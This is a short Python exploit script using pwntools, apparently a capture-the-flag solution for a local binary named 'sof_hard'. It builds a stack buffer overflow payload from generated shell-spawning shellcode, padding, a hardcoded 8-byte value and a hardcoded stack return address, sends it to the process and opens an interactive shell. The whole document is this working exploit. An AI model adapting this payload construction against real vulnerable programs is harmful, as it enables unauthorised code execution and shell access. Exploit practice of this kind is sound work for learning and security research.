#!/usr/bin/python

from pwn import*

shellcode = asm(shellcraft.sh())

print(len(shellcode))

pay = shellcode + "A"*84 + '\xbc\x2a\x3f\x40\x8e\xaf\x41\x45' + "A"*16 + p64(0x7fffffffdde0)
s = process('./sof_hard')
s.sendline(pay)
s.interactive()

